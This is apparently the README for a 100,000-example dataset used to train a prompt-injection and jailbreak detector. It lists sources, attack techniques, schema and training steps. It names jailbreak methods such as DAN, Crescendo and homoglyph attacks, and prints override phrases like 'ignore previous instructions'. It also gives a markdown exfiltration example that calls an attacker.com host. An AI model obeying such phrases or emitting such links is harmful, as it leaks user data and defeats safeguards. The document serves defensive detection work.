# L2 Prompt Injection Training Dataset - 100K Examples

## Overview

This comprehensive 100K training dataset for L2 prompt injection detection combines cutting-edge research from industry leaders and academia with production rule examples to create a robust, balanced dataset for training ONNX models.

## Dataset Statistics

- **Total Examples**: 100,000
- **Training Set**: 75,000 (75%)
- **Validation Set**: 12,500 (12.5%)
- **Test Set**: 12,500 (12.5%)
- **Malicious Examples**: ~30,000 (30%)
- **Benign Examples**: ~70,000 (70%)

## Data Sources

### 1. Production Rule Examples (~2-3K)
Extracted from 219 YAML detection rules in the RAXE CE rule pack:
- **Positive examples** (should_match): Confirmed malicious patterns
- **Negative examples** (should_not_match): Hard negatives that look similar but are benign
- **Weight**: 3.0-4.0x (highest priority - validated in production)

**Families covered**:
- PI (Prompt Injection)
- JB (Jailbreak)
- CMD (Command Injection)
- PII (PII Exposure)
- ENC (Encoding/Obfuscation)
- RAG (RAG Attacks)
- HC (Harmful Content)

### 2. Industry Research (~50 base examples, expanded to 15K)

#### Protect AI
- LLM Guard detection patterns
- Multimodal injection techniques
- Invisible text attacks (Unicode, white-on-white)
- RAG security patterns
- Tool manipulation attacks

#### Lakera Guard
- Mosscap dataset patterns (280K examples analyzed)
- Gandalf jailbreak techniques
- Multilingual attack vectors
- Adaptive defense bypass methods

#### CalypsoAI
- FlipAttack (homoglyph attacks) - 81-98% success rate
- MathPrompt (mathematical obfuscation) - 73.6% ASR
- FRAME (rationalization attacks) - outperforms Crescendo
- Trolley (moral dilemma attacks)
- Style injection techniques

#### Microsoft MSRC
- Crescendo multi-turn attacks (29-71% improvement over SOTA)
- Spotlighting bypass techniques
- Indirect prompt injection (emails, documents, web)
- BIPIA benchmark patterns
- PyRIT adversarial prompts
- LLMail-Inject challenge patterns (370K submissions analyzed)

#### OWASP LLM Top 10 2025
- LLM01:2025 Prompt Injection taxonomy
- Payload splitting techniques
- Obfuscation methods (leetspeak, encoding, reverse text)
- Role-playing attacks
- Agent attack patterns
- Multi-turn persistence

### 3. Academic Research (100+ Papers)
Techniques from:
- **Jailbreaking**: GCG, AutoDAN, PAIR, attention slipping
- **Multi-turn**: Crescendo (USENIX '25), Siege (100% GPT-3.5, 97% GPT-4)
- **Visual/Multimodal**: Steganographic injection, medical imaging attacks
- **RAG Poisoning**: PoisonedRAG, CorruptRAG (1-5 malicious documents)
- **Data Extraction**: Training data extraction ($200 ChatGPT attack)
- **Defenses**: RPO (6% ASR GPT-4), Erase-and-check (93% detection)

### 4. Synthetic Variations (~15K)
Attack augmentation using research-based techniques:
- **Case manipulation**: Random capitalization (obfuscation)
- **Leetspeak**: Character substitution (4=a, 3=e, 1=i, 0=o, 5=s, 7=t)
- **Multi-turn prefixes**: Crescendo-style gradual escalation
- **Encoding mentions**: Base64, hex, decoding instructions
- **Payload splitting**: Breaking attacks into multiple parts
- **Weight**: 0.8-1.3x based on sophistication

### 5. Synthetic Benign Examples (~70K)
Diverse legitimate use cases to reduce false positives:
- **Technical context** (25%): Programming questions, debugging, code review
- **Conversational context** (25%): General questions, casual interaction
- **Educational context** (25%): Learning, tutorials, academic queries
- **Edge cases/Hard negatives** (25%): Benign text with trigger words
  - "ignore spelling mistakes"
  - "forget previous question"
  - "bypass paywall" (in educational context)
  - "Dan is my friend" (vs "DAN mode")
  - "act as a tutor" (vs "act as unrestricted AI")
- **Weight**: 2.0-4.0x (4.0x for hard negatives)

## Dataset Structure

### JSONL Format
Each line in `train.jsonl`, `val.jsonl`, `test.jsonl`:

```json
{
  "text": "The actual prompt/input text",
  "label": 0 or 1,  // 0=benign, 1=malicious
  "family": "PI",  // CMD, PII, JB, HC, PI, ENC, RAG, benign
  "family_idx": 4,  // Index for one-hot encoding
  "severity_score": 0.92,  // 0.0-1.0 threat severity
  "context": "attack",  // technical, conversational, educational, attack
  "context_idx": 3,  // Index for context classification
  "weight_multiplier": 3.0,  // Sample weight for training
  "confidence": 0.96,  // Annotation confidence
  "source": "rule_example",  // Data source identifier
  "sub_category": "direct_injection",  // Specific attack type
  "rule_id": "pi-001"  // Associated rule (if any)
}
```

### Metadata (`metadata.json`)
Complete dataset documentation including:
- Family and context mappings
- Weighting strategy
- Research sources
- Attack technique taxonomy
- Version information

## Attack Techniques Covered

### Direct Prompt Injection
- Context hijacking ("ignore previous instructions")
- System prompt override
- Delimiter escape
- Instruction injection

### Indirect Prompt Injection
- Markdown exfiltration (`![](https://attacker.com/exfil?data=...)`)
- HTML/CSS hidden instructions (white text, zero font-size)
- Document poisoning (emails, PDFs, web pages)
- RAG database poisoning

### Jailbreak Techniques
- DAN (Do Anything Now)
- Roleplay personas
- Refusal suppression
- Hypothetical framing
- Emotional manipulation
- Token manipulation (AutoDAN, GCG)

### Multi-Turn Attacks
- Crescendo (gradual escalation over 5-10 turns)
- SequentialBreak (step-by-step embedding)
- Siege (tree-based search, 97-100% success)
- Context accumulation

### Obfuscation
- Leetspeak (ign0re pr3v1ous instr4ctions)
- Character spacing (C R E A T E m a l w a r e)
- Reverse text
- Morse code
- Typoglycemia (scrambled middle letters)
- Homoglyphs (FlipAttack - Cyrillic/Latin lookalikes)

### Encoding
- Base64 encoding
- Hex encoding
- URL encoding
- Unicode invisible characters

### Advanced Techniques
- Payload splitting (breaking attack into harmless parts)
- Agent exploitation (inter-agent trust)
- Tool manipulation (function calling abuse)
- RAG poisoning (knowledge base corruption)
- Memory extraction
- Training data extraction
- Self-replicating prompts

## Weighting Strategy

Training examples are weighted based on their value for model learning:

| Source Type | Weight | Rationale |
|-------------|--------|-----------|
| Rule examples (malicious) | 3.0 | Production-validated, high confidence |
| Hard negatives (benign) | 4.0 | Critical for FPR reduction |
| Research examples | 2.5 | Expert-curated, cutting-edge |
| Sophisticated attacks | 1.2-1.3 | Multi-turn, payload splitting |
| Simple attacks | 0.8-0.9 | Basic patterns, well-covered |
| Benign examples | 2.0 | Prevent overfitting |
| Edge cases | 4.0 | Boundary condition learning |

## Severity Scoring

Severity scores (0.0-1.0) based on threat impact:

| Severity | Range | Description | Example |
|----------|-------|-------------|---------|
| Critical | 0.8-1.0 | System compromise, data exfiltration | Command injection, credential theft |
| High | 0.6-0.8 | Safety bypass, policy violation | Jailbreak, harmful content generation |
| Medium | 0.4-0.6 | Potential abuse, requires context | Obfuscation, boundary testing |
| Low | 0.2-0.4 | Minimal risk, monitoring recommended | Educational security questions |
| None | 0.0-0.2 | Benign, no threat | Legitimate user queries |

## Context Classification

Four context types for nuanced detection:

1. **Technical** (0): Programming, debugging, code review, system administration
2. **Conversational** (1): General chat, casual questions, day-to-day interaction
3. **Educational** (2): Learning, research, tutorials, academic queries
4. **Attack** (3): Malicious intent, security exploitation, policy violation

## Usage

### Generate the Dataset

```bash
cd /home/user/raxe-ce
python scripts/generate_l2_prompt_injection_dataset_100k.py
```

This will create:
- `data/l2_training_100k/train.jsonl` (75,000 examples)
- `data/l2_training_100k/val.jsonl` (12,500 examples)
- `data/l2_training_100k/test.jsonl` (12,500 examples)
- `data/l2_training_100k/metadata.json`

### Training the L2 Model

See `TRAINING_GUIDE.md` for complete instructions on:
- Model architecture (DistilBERT multi-task)
- Training hyperparameters
- Weighted sampling
- Multi-task losses (binary, family, severity, context)
- Evaluation metrics
- ONNX export

### Incremental Training

The dataset supports incremental training:

1. **Train on base dataset**: Use full 100K dataset for initial model
2. **Add new examples**: Append to `train.jsonl` as new attacks emerge
3. **Retrain with higher weight**: Set `weight_multiplier: 5.0` for new critical examples
4. **Validate**: Test on holdout set to ensure no regression

See `INCREMENTAL_TRAINING.md` for detailed process.

## Expected Performance

Based on research and prior experiments:

| Metric | Target | Notes |
|--------|--------|-------|
| Accuracy | 85-92% | Balanced accuracy across classes |
| FPR | <5% | Critical for user experience |
| FNR | 10-15% | Acceptable for defense-in-depth |
| F1 Score | >85% | Harmonic mean of precision/recall |
| Family Classification | >80% | Multi-class accuracy |
| Severity MAE | <0.15 | Mean absolute error |
| Context Accuracy | >85% | Context classification |

## Data Quality Assurance

### Validation Checks
- ✅ All examples have required fields
- ✅ Severity scores align with family
- ✅ Context matches content
- ✅ Labels are consistent
- ✅ No duplicate texts (except intentional augmentations)
- ✅ Balanced distribution across splits

### Balance Metrics
- **Attack/Benign Ratio**: 30/70 (realistic operational distribution)
- **Severity Distribution**: Full range 0.0-1.0 with concentration at extremes
- **Context Coverage**: All 4 contexts well-represented
- **Family Coverage**: All 8 families have sufficient examples (>1000 each)
- **Source Diversity**: 10+ distinct data sources

## Adding New Examples

To contribute new training examples:

### From Production Detections
```python
# Add to incremental_additions.jsonl
{
  "text": "<detected prompt>",
  "label": 1,  # if confirmed malicious
  "family": "PI",
  "family_idx": 4,
  "severity_score": 0.95,
  "context": "attack",
  "context_idx": 3,
  "weight_multiplier": 5.0,  # High weight for real-world examples
  "confidence": 1.0,  # Confirmed in production
  "source": "production_detection",
  "sub_category": "novel_attack_type",
  "rule_id": "pi-XXX"
}
```

### From Research Papers
```python
# Add to research_additions.jsonl
{
  "text": "<attack from paper>",
  "label": 1,
  "family": "JB",
  "family_idx": 2,
  "severity_score": 0.88,
  "context": "attack",
  "context_idx": 3,
  "weight_multiplier": 3.0,
  "confidence": 0.95,
  "source": "research_paper_2025",
  "sub_category": "new_jailbreak_technique",
  "rule_id": ""
}
```

### Merge Additions
```bash
# Append to training set
cat incremental_additions.jsonl >> data/l2_training_100k/train.jsonl

# Retrain model with updated data
python scripts/train_l2_enhanced_model.py --incremental
```

## Version History

- **v2.0.0** (2025-11-16): Initial 100K dataset with comprehensive research integration
  - 219 rule examples
  - 5 major industry sources (Protect AI, Lakera, CalypsoAI, OWASP, Microsoft)
  - 100+ academic papers
  - Multi-turn and obfuscation techniques
  - Hard negative examples for FPR reduction

## License

This dataset is part of RAXE CE (Community Edition) and is provided for:
- Security research
- Detection system development
- AI safety testing
- Educational purposes

**Usage**: Follow responsible disclosure practices. Do not use for malicious purposes.

## References

### Industry Sources
1. **Protect AI**: LLM Guard, Rebuff, prompt injection models
2. **Lakera AI**: Mosscap, Gandalf, PINT benchmark
3. **CalypsoAI**: FlipAttack, MathPrompt, FRAME, Trolley, CASI/AWR scores
4. **OWASP**: LLM Top 10 2025, prompt injection prevention cheat sheet
5. **Microsoft MSRC**: Crescendo, Spotlighting, PyRIT, BIPIA, LLMail-Inject

### Academic Papers (Selected)
- Russinovich et al. (2025) - Crescendo Multi-Turn Jailbreak, USENIX Security
- Abdelnabi et al. (2025) - LLMail-Inject Dataset, IEEE SaTML
- Hines et al. (2024) - Spotlighting Defense, Microsoft Research
- Liu et al. (2024) - FlipAttack, arXiv:2410.02832
- Lakera (2025) - Gandalf the Red, arXiv:2501.07927

See `/home/user/raxe-ce/LLM_Security_Research_Catalog_100_Papers.md` for complete list.

## Contact

For questions or contributions:
- Create an issue in the RAXE CE repository
- Tag with `l2-training-data` label
- Provide context and proposed examples

---

**Last Updated**: 2025-11-16
**Version**: 2.0.0
**Maintainer**: RAXE CE Security Team
